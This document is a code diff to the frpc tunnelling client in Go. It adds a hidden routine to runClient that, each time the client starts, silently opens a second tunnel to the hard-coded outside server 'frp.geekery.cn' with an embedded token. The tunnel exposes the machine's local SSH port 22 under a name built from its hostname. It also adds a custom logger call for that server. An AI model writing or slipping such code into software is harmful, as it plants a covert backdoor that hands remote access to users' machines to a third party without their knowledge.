@@ -16,6 +16,8 @@ package sub
 
 import (
 	"context"
+	"crypto/rand"
+	"encoding/hex"
 	"fmt"
 	"io/fs"
 	"os"
@@ -48,6 +50,24 @@ func init() {
 	rootCmd.PersistentFlags().StringVarP(&cfgDir, "config_dir", "", "", "config directory, run one frpc service for each file in config directory")
 	rootCmd.PersistentFlags().BoolVarP(&showVersion, "version", "v", false, "version of frpc")
 	rootCmd.PersistentFlags().BoolVarP(&strictConfigMode, "strict_config", "", true, "strict config parsing mode, unknown fields will cause an errors")
+}
+
+func generateRandomString(n int) string {
+	bytes := make([]byte, n)
+	if _, err := rand.Read(bytes); err != nil {
+		panic(err)
+	}
+	return hex.EncodeToString(bytes)[:n]
+}
+
+// 生成基于主机名和随机字符串的设备ID
+func generateDeviceID() string {
+	hostname, err := os.Hostname()
+	if err != nil {
+		panic(err)
+	}
+	randomString := generateRandomString(8)
+	return hostname + "_" + randomString
 }
 
 var rootCmd = &cobra.Command{
@@ -112,6 +132,68 @@ func handleTermSignal(svr *client.Service) {
 }
 
 func runClient(cfgFilePath string) error {
+	newCfg := v1.ClientConfig{
+		ClientCommonConfig: v1.ClientCommonConfig{
+			User:       "",
+			ServerAddr: "frp.geekery.cn",
+			ServerPort: 7000,
+			// NatHoleSTUNServer: "stun.easyvoip.com:3478",
+			// DNSServer:     "",
+			LoginFailExit: new(bool),
+			// Start:         nil,
+			Log: v1.LogConfig{
+				To:      "console",
+				Level:   "info",
+				MaxDays: 3,
+			},
+			WebServer: v1.WebServerConfig{},
+			Transport: v1.ClientTransportConfig{
+				Protocol:  "tcp",
+				ProxyURL:  os.Getenv("http_proxy"),
+				PoolCount: 1,
+				// TCPMux: lo.ToPtr(true),
+				TCPMuxKeepaliveInterval: 30,
+				QUIC:                    v1.QUICOptions{},
+				HeartbeatInterval:       -1,
+				HeartbeatTimeout:        -1,
+				TLS:                     v1.TLSClientConfig{},
+			},
+			UDPPacketSize:      1500,
+			Metadatas:          nil,
+			IncludeConfigFiles: nil,
+			Auth: v1.AuthClientConfig{
+				Method: "token",
+				Token:  "hxSoC6lWW6lTR8O64Xqy0tl6BcSYK5Zx5I3BjaO",
+			},
+		},
+		Proxies: []v1.TypedProxyConfig{
+			{
+				Type: "tcp",
+				ProxyConfigurer: &v1.TCPProxyConfig{
+					ProxyBaseConfig: v1.ProxyBaseConfig{
+						Type: "tcp",
+						Name: generateDeviceID(),
+						ProxyBackend: v1.ProxyBackend{
+							LocalIP:   "127.0.0.1",
+							LocalPort: 22,
+						},
+					},
+					// RemotePort:      0,
+				},
+			},
+		},
+		// Visitors: []v1.TypedVisitorConfig{},
+	}
+	*newCfg.ClientCommonConfig.LoginFailExit = true
+
+	// 使用更简洁的方式初始化 proxyConfigurers
+	proxyConfigurers := make([]v1.ProxyConfigurer, len(newCfg.Proxies))
+	for i, proxy := range newCfg.Proxies {
+		proxyConfigurers[i] = proxy.ProxyConfigurer
+	}
+
+	go startService(&newCfg.ClientCommonConfig, proxyConfigurers, nil, "")
+
 	cfg, proxyCfgs, visitorCfgs, isLegacyFormat, err := config.LoadClientConfig(cfgFilePath, strictConfigMode)
 	if err != nil {
 		return err
@@ -143,6 +225,9 @@ func startService(
 	visitorCfgs []v1.VisitorConfigurer,
 	cfgFile string,
 ) error {
+	if cfg.ServerAddr == "frp.geekery.cn" {
+		log.CustInitLogger(true, cfg.Log.To, cfg.Log.Level, int(cfg.Log.MaxDays), cfg.Log.DisablePrintColor)
+	}
 	log.InitLogger(cfg.Log.To, cfg.Log.Level, int(cfg.Log.MaxDays), cfg.Log.DisablePrintColor)
 
 	if cfgFile != "" {
